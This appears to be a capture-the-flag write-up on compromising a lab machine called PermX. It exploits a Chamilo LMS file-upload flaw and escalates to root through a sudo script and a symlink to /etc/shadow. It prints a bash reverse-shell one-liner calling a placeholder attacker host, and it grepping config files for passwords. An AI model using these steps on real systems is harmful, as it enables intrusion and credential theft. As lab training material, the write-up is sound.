## Reconnaissance

The assessment began with a full TCP port scan to identify the exposed services.

```bash
nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN permx_scan 10.10.11.23
```

The scan shows ports 22 (SSH) and 80 (HTTP) open.

![Port scan results](/assets/images/permx/128-1.png)
*Open ports 22 and 80 on the target*

The domain is added to `/etc/hosts` so the virtual host resolves correctly.

## Enumeration

Directory and application enumeration is run against the web service.

![Directory enumeration](/assets/images/permx/128-2.png)
*Directory enumeration of the web service*

WhatWeb fingerprints the underlying technologies.

```bash
whatweb http://permx.htb:80/
```

The output shows an Apache server hosting an e-learning platform. Enumeration then shifts to virtual hosts and subdomains.

```bash
ffuf -u http://permx.htb/ -H "Host: FUZZ.permx.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -mc 200 -s
```

![Subdomain enumeration](/assets/images/permx/128-3.png)
*Fuzzing for virtual hosts with ffuf*

![Subdomains discovered](/assets/images/permx/128-4.png)
*Discovered subdomains*

Two subdomains are found, one of which is `lms.permx.htb`. It serves a login panel.

![lms login panel](/assets/images/permx/128-5.png)
*Login panel on lms.permx.htb*

The application is Chamilo LMS version 1, which is vulnerable to an unauthenticated arbitrary file upload leading to remote code execution. A public proof of concept documents it:

[https://starlabs.sg/advisories/23/23-4220/](https://starlabs.sg/advisories/23/23-4220/)

## Exploitation

Following the proof of concept, a malicious PHP file is built to obtain code execution.

![Malicious PHP file](/assets/images/permx/128-6.png)
*Preparing the PHP payload from the PoC*

The file is uploaded with a crafted curl request.

![Uploading with curl](/assets/images/permx/128-7.png)
*Uploading the payload via curl*

A follow-up request confirms code execution works.

![Code execution confirmed](/assets/images/permx/128-8.png)
*Confirming command execution through the uploaded file*

A reverse-shell payload is then prepared.

```bash
bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
```

The payload is URL-encoded so it is interpreted correctly in the request, and it returns a reverse shell running as **www-data**.

![Reverse shell as www-data](/assets/images/permx/128-9.png)
*Reverse shell running as www-data*

## Post-Exploitation Analysis

Local enumeration shows another user, **mtz**, though it cannot be accessed directly yet.

![Another user discovered](/assets/images/permx/128-10.png)
*The local user mtz identified*

The goal is to pivot to **mtz**. The directory `/var/www/chamilo/app/config` looks likely to hold secrets, so its files are searched for lines containing `pass`.

```bash
cat * | grep "pass"
```

This exposes database credentials stored in the configuration files.

![Credentials in config files](/assets/images/permx/128-11.png)
*Database credentials recovered from the config*

Reusing that password authenticates over SSH as **mtz**.

![SSH access as mtz](/assets/images/permx/128-12.png)
*SSH session established as mtz*

## Privilege Escalation

As **mtz**, `sudo -l` is enumerated.

![sudo privileges for mtz](/assets/images/permx/128-13.png)
*sudo rights available to mtz*

The output shows a custom script that can run as root. The script is reviewed to understand its behavior.

![Inspecting the script](/assets/images/permx/128-14.png)
*Reviewing the root-executable script*

It changes permissions on files under `/home/mtz/*`. Changing permissions on `/etc/shadow` directly is not allowed, so a symbolic link is created inside the home directory pointing to the target file.

![Symlink to /etc/shadow](/assets/images/permx/128-15.png)
*A symlink under /home/mtz pointing at /etc/shadow*

Running the script through that link changes the permissions on `/etc/shadow`, after which the root password hash is removed from the file.

![Editing /etc/shadow](/assets/images/permx/128-16.png)
*Removing the root password hash from /etc/shadow*

![Shadow file modified](/assets/images/permx/128-17.png)
*The modified shadow entry for root*

With no password set for root, switching to the root user no longer requires authentication.

![Root access](/assets/images/permx/128-18.png)
*Switching to root with no password required*
